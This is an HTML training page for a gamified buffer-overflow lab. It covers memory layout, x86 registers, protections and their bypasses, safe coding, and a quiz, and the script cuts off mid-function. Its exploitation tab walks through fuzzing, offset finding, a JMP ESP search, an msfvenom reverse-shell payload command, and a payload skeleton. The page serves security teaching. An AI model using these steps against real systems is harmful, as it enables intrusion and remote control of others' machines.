<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buffer Overflow & Exploitation Lab - Hexworth Prime Dark Arts Vault</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #a855f7;
            --accent: #dc2626;
            --bg: #0a0a0f;
            --bg-secondary: #1a1a2e;
            --bg-tertiary: #2a2a3e;
            --text: #e0e0e0;
            --text-dim: #a0a0a0;
            --success: #10b981;
            --warning: #f59e0b;
            --border: #3a3a4e;
        }

        body {
            background: linear-gradient(135deg, var(--bg) 0%, #0f0f1a 100%);
            color: var(--text);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            border-radius: 15px;
            border: 2px solid var(--primary);
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            color: var(--text-dim);
            font-size: 1.1em;
        }

        .warning-banner {
            background: linear-gradient(135deg, rgba(220, 38, 38, 0.2) 0%, rgba(168, 85, 247, 0.2) 100%);
            border: 2px solid var(--accent);
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }

        .warning-banner strong {
            color: var(--accent);
            font-size: 1.1em;
        }

        .nav-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .nav-btn {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            color: var(--primary);
            border: 2px solid var(--primary);
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }

        .nav-btn:hover {
            background: var(--primary);
            color: var(--bg);
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(168, 85, 247, 0.4);
        }

        .section {
            background: var(--bg-secondary);
            border: 2px solid var(--border);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .section h2 {
            color: var(--primary);
            margin-bottom: 20px;
            font-size: 1.8em;
            border-bottom: 2px solid var(--primary);
            padding-bottom: 10px;
        }

        .section h3 {
            color: var(--accent);
            margin: 20px 0 10px 0;
            font-size: 1.3em;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .tab {
            background: var(--bg-tertiary);
            color: var(--text-dim);
            border: 2px solid var(--border);
            padding: 10px 20px;
            border-radius: 8px 8px 0 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .tab.active {
            background: var(--primary);
            color: var(--bg);
            border-color: var(--primary);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .memory-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .memory-section {
            background: var(--bg-tertiary);
            border: 2px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            transition: all 0.3s ease;
        }

        .memory-section:hover {
            border-color: var(--primary);
            transform: translateY(-3px);
            box-shadow: 0 5px 20px rgba(168, 85, 247, 0.3);
        }

        .memory-section h4 {
            color: var(--primary);
            margin-bottom: 10px;
        }

        .stack-visualization {
            background: var(--bg);
            border: 2px solid var(--primary);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
        }

        .stack-cell {
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            padding: 8px;
            margin: 2px 0;
            display: flex;
            justify-content: space-between;
            transition: all 0.3s ease;
            border-radius: 4px;
        }

        .stack-cell.overflow {
            background: linear-gradient(90deg, var(--accent) 0%, rgba(220, 38, 38, 0.3) 100%);
            border-color: var(--accent);
            animation: pulse 1s infinite;
        }

        .stack-cell.eip {
            background: linear-gradient(90deg, var(--primary) 0%, rgba(168, 85, 247, 0.3) 100%);
            border-color: var(--primary);
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .register-panel {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .register {
            background: var(--bg-tertiary);
            border: 2px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .register.highlight {
            border-color: var(--accent);
            box-shadow: 0 0 20px rgba(220, 38, 38, 0.5);
        }

        .register-name {
            color: var(--primary);
            font-weight: bold;
            font-size: 1.1em;
            margin-bottom: 5px;
        }

        .register-value {
            font-family: 'Courier New', monospace;
            color: var(--text);
            font-size: 1em;
        }

        .control-panel {
            background: var(--bg-tertiary);
            border: 2px solid var(--primary);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }

        .control-row {
            display: flex;
            gap: 15px;
            margin: 15px 0;
            align-items: center;
            flex-wrap: wrap;
        }

        .control-btn {
            background: linear-gradient(135deg, var(--primary) 0%, #9333ea 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            transition: all 0.3s ease;
        }

        .control-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(168, 85, 247, 0.5);
        }

        .control-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .control-btn.danger {
            background: linear-gradient(135deg, var(--accent) 0%, #991b1b 100%);
        }

        .control-btn.success {
            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
        }

        input[type="text"], input[type="number"], textarea {
            background: var(--bg);
            color: var(--text);
            border: 2px solid var(--border);
            border-radius: 6px;
            padding: 10px;
            font-size: 1em;
            font-family: 'Courier New', monospace;
            width: 100%;
            max-width: 400px;
        }

        input[type="text"]:focus, input[type="number"]:focus, textarea:focus {
            outline: none;
            border-color: var(--primary);
        }

        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 30px;
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: var(--bg-tertiary);
            border: 2px solid var(--border);
            transition: 0.3s;
            border-radius: 30px;
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 20px;
            width: 20px;
            left: 3px;
            bottom: 3px;
            background-color: var(--text-dim);
            transition: 0.3s;
            border-radius: 50%;
        }

        input:checked + .slider {
            background-color: var(--primary);
            border-color: var(--primary);
        }

        input:checked + .slider:before {
            transform: translateX(30px);
            background-color: white;
        }

        .shellcode-viewer {
            background: var(--bg);
            border: 2px solid var(--primary);
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            overflow-x: auto;
            margin: 15px 0;
        }

        .shellcode-byte {
            display: inline-block;
            padding: 3px 6px;
            margin: 2px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            border-radius: 3px;
            transition: all 0.3s ease;
        }

        .shellcode-byte:hover {
            background: var(--primary);
            transform: scale(1.1);
        }

        .info-box {
            background: linear-gradient(135deg, rgba(168, 85, 247, 0.1) 0%, rgba(168, 85, 247, 0.05) 100%);
            border-left: 4px solid var(--primary);
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }

        .danger-box {
            background: linear-gradient(135deg, rgba(220, 38, 38, 0.1) 0%, rgba(220, 38, 38, 0.05) 100%);
            border-left: 4px solid var(--accent);
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }

        .success-box {
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(16, 185, 129, 0.05) 100%);
            border-left: 4px solid var(--success);
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }

        .quiz-container {
            background: var(--bg-tertiary);
            border: 2px solid var(--primary);
            border-radius: 12px;
            padding: 25px;
            margin: 20px 0;
        }

        .quiz-question {
            margin: 20px 0;
            padding: 20px;
            background: var(--bg-secondary);
            border-radius: 8px;
            border: 2px solid var(--border);
        }

        .quiz-question h4 {
            color: var(--primary);
            margin-bottom: 15px;
        }

        .quiz-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .quiz-option {
            background: var(--bg);
            border: 2px solid var(--border);
            padding: 12px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .quiz-option:hover {
            border-color: var(--primary);
            background: var(--bg-tertiary);
        }

        .quiz-option.selected {
            border-color: var(--primary);
            background: rgba(168, 85, 247, 0.2);
        }

        .quiz-option.correct {
            border-color: var(--success);
            background: rgba(16, 185, 129, 0.2);
        }

        .quiz-option.incorrect {
            border-color: var(--accent);
            background: rgba(220, 38, 38, 0.2);
        }

        .progress-bar {
            background: var(--bg);
            border: 2px solid var(--border);
            border-radius: 10px;
            height: 30px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary) 0%, var(--accent) 100%);
            transition: width 0.5s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }

        .xp-badge {
            display: inline-block;
            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: bold;
            margin: 10px 0;
        }

        .code-block {
            background: var(--bg);
            border: 2px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
        }

        .code-block code {
            color: var(--text);
        }

        .animation-area {
            background: var(--bg);
            border: 2px solid var(--primary);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            min-height: 300px;
            position: relative;
        }

        .memory-arrow {
            color: var(--accent);
            font-size: 2em;
            text-align: center;
            margin: 10px 0;
            animation: blink 1.5s infinite;
        }

        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0.3; }
        }

        .protection-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .protection-card {
            background: var(--bg-tertiary);
            border: 2px solid var(--border);
            border-radius: 8px;
            padding: 20px;
            transition: all 0.3s ease;
        }

        .protection-card.enabled {
            border-color: var(--success);
            box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
        }

        .protection-card.disabled {
            border-color: var(--accent);
            opacity: 0.7;
        }

        .protection-card h4 {
            color: var(--primary);
            margin-bottom: 10px;
        }

        .stats-panel {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .stat-card {
            background: var(--bg-tertiary);
            border: 2px solid var(--primary);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }

        .stat-value {
            font-size: 2em;
            color: var(--primary);
            font-weight: bold;
        }

        .stat-label {
            color: var(--text-dim);
            font-size: 0.9em;
            margin-top: 5px;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 1.8em;
            }

            .section {
                padding: 15px;
            }

            .control-row {
                flex-direction: column;
                align-items: stretch;
            }

            input[type="text"], input[type="number"] {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Buffer Overflow & Exploitation Lab</h1>
            <p class="subtitle">Master the Dark Art of Memory Corruption</p>
            <div class="warning-banner">
                <strong>EDUCATIONAL PURPOSE ONLY</strong><br>
                This lab is designed for defensive security training. Unauthorized exploitation is illegal.
            </div>
        </header>

        <div class="nav-buttons">
            <a href="../index.html" class="nav-btn">Return to Dark Arts Vault</a>
            <a href="../../index.html" class="nav-btn">Hexworth Prime Home</a>
        </div>

        <div class="section">
            <h2>Your Progress</h2>
            <div class="stats-panel">
                <div class="stat-card">
                    <div class="stat-value" id="completionRate">0%</div>
                    <div class="stat-label">Completion</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="xpEarned">0</div>
                    <div class="stat-label">XP Earned</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="exploitsRun">0</div>
                    <div class="stat-label">Exploits Simulated</div>
                </div>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill" style="width: 0%;">0%</div>
            </div>
        </div>

        <div class="section">
            <h2>Concept Overview</h2>
            <div class="tabs">
                <div class="tab active" onclick="switchTab('basics')">Basics</div>
                <div class="tab" onclick="switchTab('types')">Types</div>
                <div class="tab" onclick="switchTab('registers')">Registers</div>
                <div class="tab" onclick="switchTab('exploitation')">Exploitation</div>
                <div class="tab" onclick="switchTab('protections')">Protections</div>
            </div>

            <div id="basics" class="tab-content active">
                <h3>What is a Buffer Overflow?</h3>
                <p>A buffer overflow occurs when a program writes more data to a buffer (fixed-size memory region) than it can hold, causing data to spill into adjacent memory locations.</p>

                <div class="info-box">
                    <strong>Root Causes:</strong>
                    <ul>
                        <li><strong>Improper Memory Allocation:</strong> Insufficient buffer size for expected input</li>
                        <li><strong>No Bounds Checking:</strong> Functions like strcpy(), gets() don't validate input length</li>
                        <li><strong>Unsafe Languages:</strong> C/C++ allow direct memory manipulation without safety checks</li>
                    </ul>
                </div>

                <div class="danger-box">
                    <strong>Consequences:</strong>
                    <ul>
                        <li>Program crashes and denial of service</li>
                        <li>Arbitrary code execution (ACE)</li>
                        <li>Privilege escalation</li>
                        <li>System compromise</li>
                    </ul>
                </div>

                <h3>Memory Layout</h3>
                <div class="memory-grid">
                    <div class="memory-section">
                        <h4>Stack (High Address)</h4>
                        <p>Static allocation, grows downward. Contains local variables, function parameters, return addresses.</p>
                    </div>
                    <div class="memory-section">
                        <h4>Heap</h4>
                        <p>Dynamic allocation (malloc/new), grows upward. Runtime-allocated memory for objects and data structures.</p>
                    </div>
                    <div class="memory-section">
                        <h4>Data Segment</h4>
                        <p>Global and static variables. Initialized and uninitialized data sections (BSS).</p>
                    </div>
                    <div class="memory-section">
                        <h4>Code Segment (Low Address)</h4>
                        <p>Executable program instructions. Usually read-only to prevent code modification.</p>
                    </div>
                </div>
            </div>

            <div id="types" class="tab-content">
                <h3>Stack-Based Buffer Overflow</h3>
                <div class="info-box">
                    <p><strong>Characteristics:</strong> Most common type. Exploits stack memory where local variables and return addresses are stored.</p>
                    <ul>
                        <li>Targets EBP (Base Pointer) and EIP (Instruction Pointer)</li>
                        <li>Overwrites return address to redirect execution</li>
                        <li>Predictable memory layout in many architectures</li>
                    </ul>
                </div>

                <div class="code-block">
<code>void vulnerable_function(char *input) {
    char buffer[64];  // 64-byte buffer
    strcpy(buffer, input);  // No bounds checking!
    // If input > 64 bytes, overflow occurs
}</code>
                </div>

                <h3>Heap-Based Buffer Overflow</h3>
                <div class="info-box">
                    <p><strong>Characteristics:</strong> Exploits dynamically allocated memory. More complex but highly dangerous.</p>
                    <ul>
                        <li>Uses malloc(), calloc(), realloc()</li>
                        <li>Can overwrite heap metadata (chunk headers)</li>
                        <li>Targets function pointers, vtables, or adjacent heap objects</li>
                        <li>Less predictable than stack overflows</li>
                    </ul>
                </div>

                <div class="code-block">
<code>char *buffer = (char*)malloc(64);
strcpy(buffer, user_input);  // Overflow if input > 64 bytes
// Can corrupt adjacent heap chunks</code>
                </div>
            </div>

            <div id="registers" class="tab-content">
                <h3>Key CPU Registers (x86 Architecture)</h3>

                <div class="register-panel">
                    <div class="register">
                        <div class="register-name">EIP</div>
                        <div class="register-value">0x08048000</div>
                        <p style="font-size: 0.9em; margin-top: 10px; color: var(--text-dim);">Extended Instruction Pointer - Points to next instruction to execute</p>
                    </div>
                    <div class="register">
                        <div class="register-name">ESP</div>
                        <div class="register-value">0xbffff7a0</div>
                        <p style="font-size: 0.9em; margin-top: 10px; color: var(--text-dim);">Extended Stack Pointer - Points to top of stack</p>
                    </div>
                    <div class="register">
                        <div class="register-name">EBP</div>
                        <div class="register-value">0xbffff7c8</div>
                        <p style="font-size: 0.9em; margin-top: 10px; color: var(--text-dim);">Extended Base Pointer - Reference point for stack frame</p>
                    </div>
                    <div class="register">
                        <div class="register-name">EAX</div>
                        <div class="register-value">0x00000000</div>
                        <p style="font-size: 0.9em; margin-top: 10px; color: var(--text-dim);">Accumulator - Return values, arithmetic</p>
                    </div>
                </div>

                <div class="danger-box">
                    <strong>The Critical Target: EIP</strong>
                    <p>Control the EIP register, and you control the program's execution flow. By overwriting the saved return address on the stack with your chosen address, you can redirect execution to shellcode or existing code (ROP chains).</p>
                </div>

                <div class="info-box">
                    <strong>Stack Frame Structure:</strong>
                    <ul>
                        <li><strong>Function Parameters:</strong> Pushed onto stack before call</li>
                        <li><strong>Return Address:</strong> Address to return to after function completes</li>
                        <li><strong>Saved EBP:</strong> Previous stack frame's base pointer</li>
                        <li><strong>Local Variables:</strong> Function's local data (buffer location!)</li>
                    </ul>
                </div>
            </div>

            <div id="exploitation" class="tab-content">
                <h3>Buffer Overflow Exploitation Process</h3>

                <div class="info-box">
                    <strong>Step 1: Fuzzing</strong>
                    <p>Send increasingly large inputs to find the crash point. Determine exactly how many bytes cause the overflow.</p>
                    <div class="code-block">
<code># Python fuzzing example
for i in range(0, 5000, 100):
    payload = "A" * i
    send_to_target(payload)</code>
                    </div>
                </div>

                <div class="info-box">
                    <strong>Step 2: Controlling EIP</strong>
                    <p>Use pattern_create and pattern_offset tools to find exact offset to EIP.</p>
                    <div class="code-block">
<code># Metasploit tools
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396F4338</code>
                    </div>
                </div>

                <div class="info-box">
                    <strong>Step 3: Finding Bad Characters</strong>
                    <p>Identify characters that break the exploit (null bytes, newlines, etc.). Send all possible bytes and check which ones are mangled.</p>
                    <div class="code-block">
<code>badchars = (
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
# ... check each byte in memory
)</code>
                    </div>
                </div>

                <div class="info-box">
                    <strong>Step 4: Finding Return Address (JMP ESP)</strong>
                    <p>Find a JMP ESP instruction in executable memory (not affected by ASLR). This becomes our return address.</p>
                    <div class="code-block">
<code># Using mona.py in Immunity Debugger
!mona jmp -r esp -cpb "\x00\x0a\x0d"
# Returns address like: 0x625011af</code>
                    </div>
                </div>

                <div class="info-box">
                    <strong>Step 5: Generating Shellcode</strong>
                    <p>Create payload using msfvenom, avoiding bad characters.</p>
                    <div class="code-block">
<code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b "\x00\x0a\x0d" -f python -v shellcode</code>
                    </div>
                </div>

                <div class="success-box">
                    <strong>Final Exploit Structure:</strong>
                    <div class="code-block">
<code>payload = ""
payload += "A" * offset          # Fill buffer
payload += "\xaf\x11\x50\x62"   # JMP ESP address (little-endian)
payload += "\x90" * 16           # NOP sled
payload += shellcode             # Malicious code</code>
                    </div>
                </div>
            </div>

            <div id="protections" class="tab-content">
                <h3>Modern Protection Mechanisms</h3>

                <div class="protection-grid">
                    <div class="protection-card">
                        <h4>DEP (Data Execution Prevention)</h4>
                        <p><strong>Also known as:</strong> NX (No-eXecute), W^X (Write XOR Execute)</p>
                        <p><strong>How it works:</strong> Marks memory pages as either writable OR executable, never both. Prevents shellcode execution on the stack.</p>
                        <p><strong>Bypass:</strong> Return-Oriented Programming (ROP) - chain existing code snippets (gadgets) instead of injecting new code.</p>
                    </div>

                    <div class="protection-card">
                        <h4>ASLR (Address Space Layout Randomization)</h4>
                        <p><strong>How it works:</strong> Randomizes memory addresses of stack, heap, libraries on each execution. Makes hardcoded addresses unreliable.</p>
                        <p><strong>Bypass:</strong> Information leaks to discover addresses, brute force on 32-bit systems, ROP chains with relative addressing.</p>
                    </div>

                    <div class="protection-card">
                        <h4>Stack Canaries</h4>
                        <p><strong>Also known as:</strong> Stack cookies, stack guards</p>
                        <p><strong>How it works:</strong> Places random value before return address. Checks if canary is intact before function returns.</p>
                        <p><strong>Bypass:</strong> Leak canary value, overwrite canary with correct value, target other memory regions.</p>
                    </div>

                    <div class="protection-card">
                        <h4>Safe Coding Practices</h4>
                        <p><strong>Prevention methods:</strong></p>
                        <ul>
                            <li>Use safe functions: strncpy() vs strcpy()</li>
                            <li>Input validation and bounds checking</li>
                            <li>Modern languages (Rust, Go) with memory safety</li>
                            <li>Static analysis tools (Coverity, Fortify)</li>
                            <li>Compiler flags: -fstack-protector, -D_FORTIFY_SOURCE</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>Interactive Stack Simulator</h2>
            <p>Visualize how buffer overflows corrupt stack memory and overwrite the EIP register.</p>

            <div class="control-panel">
                <div class="control-row">
                    <label>Buffer Size: <input type="number" id="bufferSize" value="64" min="16" max="256" style="width: 100px;"></label>
                    <label>Input Data: <input type="text" id="inputData" value="AAAA" placeholder="Enter data..."></label>
                    <button class="control-btn" onclick="simulateOverflow()">Simulate Overflow</button>
                    <button class="control-btn success" onclick="resetSimulator()">Reset</button>
                </div>
                <div class="control-row">
                    <label>
                        <input type="checkbox" id="depEnabled" onchange="updateProtections()">
                        DEP Enabled
                    </label>
                    <label>
                        <input type="checkbox" id="aslrEnabled" onchange="updateProtections()">
                        ASLR Enabled
                    </label>
                    <label>
                        <input type="checkbox" id="canaryEnabled" onchange="updateProtections()">
                        Stack Canary
                    </label>
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
                <div>
                    <h3>Before Overflow</h3>
                    <div class="stack-visualization" id="stackBefore">
                        <div class="stack-cell">
                            <span>0xbffff7f0:</span>
                            <span>EIP = 0x08048450</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7ec:</span>
                            <span>Saved EBP = 0xbffff808</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7e8:</span>
                            <span>Local Var 2 = 0x00000000</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7e4:</span>
                            <span>Local Var 1 = 0x00000000</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7a0-e0:</span>
                            <span>Buffer[64] = (empty)</span>
                        </div>
                    </div>
                </div>

                <div>
                    <h3>After Overflow</h3>
                    <div class="stack-visualization" id="stackAfter">
                        <div class="stack-cell">
                            <span>0xbffff7f0:</span>
                            <span>EIP = 0x08048450</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7ec:</span>
                            <span>Saved EBP = 0xbffff808</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7e8:</span>
                            <span>Local Var 2 = 0x00000000</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7e4:</span>
                            <span>Local Var 1 = 0x00000000</span>
                        </div>
                        <div class="stack-cell">
                            <span>0xbffff7a0-e0:</span>
                            <span>Buffer[64] = (empty)</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="register-panel" id="registerState">
                <div class="register" id="regEIP">
                    <div class="register-name">EIP</div>
                    <div class="register-value">0x08048450</div>
                </div>
                <div class="register" id="regESP">
                    <div class="register-name">ESP</div>
                    <div class="register-value">0xbffff7a0</div>
                </div>
                <div class="register" id="regEBP">
                    <div class="register-name">EBP</div>
                    <div class="register-value">0xbffff808</div>
                </div>
            </div>

            <div id="exploitResult" style="margin-top: 20px;"></div>
        </div>

        <div class="section">
            <h2>Shellcode Anatomy</h2>
            <p>Understanding the structure of shellcode - the malicious payload executed after successful exploitation.</p>

            <div class="control-panel">
                <div class="control-row">
                    <select id="shellcodeType" onchange="generateShellcode()">
                        <option value="reverse">Reverse Shell</option>
                        <option value="bind">Bind Shell</option>
                        <option value="exec">Execute Command</option>
                        <option value="messagebox">MessageBox (Windows)</option>
                    </select>
                    <button class="control-btn" onclick="generateShellcode()">Generate Shellcode</button>
                </div>
            </div>

            <div class="shellcode-viewer" id="shellcodeDisplay">
                <p style="color: var(--text-dim);">Click "Generate Shellcode" to see example payload...</p>
            </div>

            <div class="info-box">
                <strong>Shellcode Components:</strong>
                <ul>
                    <li><strong>NOP Sled (0x90):</strong> Series of no-operation instructions to increase landing zone</li>
                    <li><strong>Decoder Stub:</strong> Decodes encoded payload to evade detection</li>
                    <li><strong>Payload:</strong> Actual malicious code (shell, command execution)</li>
                    <li><strong>Exit Handler:</strong> Gracefully terminates to avoid crashes</li>
                </ul>
            </div>
        </div>

        <div class="section">
            <h2>Exploitation Tools Reference</h2>

            <div class="memory-grid">
                <div class="memory-section">
                    <h4>Debuggers</h4>
                    <ul>
                        <li><strong>Immunity Debugger:</strong> Windows debugger with Python scripting (mona.py)</li>
                        <li><strong>OllyDbg:</strong> x86 debugger for Windows binaries</li>
                        <li><strong>GDB:</strong> GNU Debugger for Linux (PEDA, GEF extensions)</li>
                        <li><strong>WinDbg:</strong> Microsoft's powerful kernel/user-mode debugger</li>
                    </ul>
                </div>

                <div class="memory-section">
                    <h4>Exploitation Frameworks</h4>
                    <ul>
                        <li><strong>Metasploit:</strong> Complete exploitation framework with modules</li>
                        <li><strong>pwntools:</strong> Python CTF framework and exploit development</li>
                        <li><strong>ROPgadget:</strong> Find ROP gadgets in binaries</li>
                        <li><strong>Ropper:</strong> Advanced ROP gadget finder</li>
                    </ul>
                </div>

                <div class="memory-section">
                    <h4>Analysis Tools</h4>
                    <ul>
                        <li><strong>IDA Pro/Ghidra:</strong> Reverse engineering and disassembly</li>
                        <li><strong>Binary Ninja:</strong> Modern reverse engineering platform</li>
                        <li><strong>radare2:</strong> Open-source reverse engineering framework</li>
                        <li><strong>Hopper:</strong> macOS/Linux disassembler</li>
                    </ul>
                </div>

                <div class="memory-section">
                    <h4>Payload Generation</h4>
                    <ul>
                        <li><strong>msfvenom:</strong> Metasploit payload generator</li>
                        <li><strong>shellcraft:</strong> pwntools shellcode generator</li>
                        <li><strong>nasm:</strong> Netwide Assembler for custom shellcode</li>
                        <li><strong>Veil:</strong> Payload generator for AV evasion</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>Knowledge Assessment</h2>
            <p>Test your understanding of buffer overflow concepts and exploitation techniques.</p>

            <div class="quiz-container">
                <div id="quizQuestions"></div>
                <button class="control-btn" onclick="submitQuiz()" id="submitQuizBtn" style="margin-top: 20px;">Submit Answers</button>
                <div id="quizResults" style="margin-top: 20px;"></div>
            </div>
        </div>

        <div class="section">
            <h2>Completion Status</h2>
            <div id="completionStatus">
                <p>Complete all sections and pass the quiz to earn your XP reward!</p>
                <div class="info-box">
                    <strong>Requirements:</strong>
                    <ul>
                        <li>Review all concept tabs</li>
                        <li>Run at least 3 overflow simulations</li>
                        <li>Generate shellcode examples</li>
                        <li>Score 80% or higher on the quiz</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="nav-buttons">
            <a href="../index.html" class="nav-btn">Return to Dark Arts Vault</a>
            <a href="../../index.html" class="nav-btn">Hexworth Prime Home</a>
        </div>
    </div>

    <script>
        // State management
        let state = {
            exploitsRun: 0,
            tabsViewed: new Set(),
            shellcodeGenerated: false,
            quizScore: 0,
            quizCompleted: false,
            progress: 0
        };

        // Quiz questions
        const quizData = [
            {
                question: "What is the primary cause of buffer overflow vulnerabilities?",
                options: [
                    "Incorrect encryption algorithms",
                    "Lack of bounds checking on input data",
                    "Using outdated software versions",
                    "Weak password policies"
                ],
                correct: 1
            },
            {
                question: "Which register controls the execution flow in x86 architecture?",
                options: [
                    "ESP (Stack Pointer)",
                    "EBP (Base Pointer)",
                    "EIP (Instruction Pointer)",
                    "EAX (Accumulator)"
                ],
                correct: 2
            },
            {
                question: "What is the purpose of a NOP sled in exploit payloads?",
                options: [
                    "To encrypt the shellcode",
                    "To increase the landing zone for shellcode execution",
                    "To bypass firewalls",
                    "To disable antivirus software"
                ],
                correct: 1
            },
            {
                question: "Which protection mechanism marks memory as either writable OR executable?",
                options: [
                    "ASLR",
                    "Stack Canary",
                    "DEP/NX",
                    "SafeSEH"
                ],
                correct: 2
            },
            {
                question: "What tool is commonly used to generate shellcode in Metasploit?",
                options: [
                    "msfconsole",
                    "msfvenom",
                    "meterpreter",
                    "armitage"
                ],
                correct: 1
            },
            {
                question: "In stack-based buffer overflows, what is typically overwritten to redirect execution?",
                options: [
                    "Heap metadata",
                    "Global variables",
                    "Return address on the stack",
                    "Program counter"
                ],
                correct: 2
            },
            {
                question: "What does ASLR stand for?",
                options: [
                    "Advanced Security Layer Randomization",
                    "Address Space Layout Randomization",
                    "Automatic Stack Location Reversal",
                    "Application Security Level Rating"
                ],
                correct: 1
            },
            {
                question: "Which technique is used to bypass DEP/NX protections?",
                options: [
                    "SQL Injection",
                    "Cross-Site Scripting",
                    "Return-Oriented Programming (ROP)",
                    "Brute Force"
                ],
                correct: 2
            },
            {
                question: "What is the purpose of finding bad characters during exploit development?",
                options: [
                    "To make the exploit harder to detect",
                    "To identify characters that will break or terminate the payload",
                    "To encrypt the shellcode",
                    "To calculate the buffer size"
                ],
                correct: 1
            },
            {
                question: "Which of these is a safe alternative to the vulnerable strcpy() function?",
                options: [
                    "strcat()",
                    "sprintf()",
                    "strncpy()",
                    "gets()"
                ],
                correct: 2
            }
        ];

        // Initialize quiz
        function initQuiz() {
            const container = document.getElementById('quizQuestions');
            container.innerHTML = '';

            quizData.forEach((q, index) => {
                const questionDiv = document.createElement('div');
                questionDiv.className = 'quiz-question';
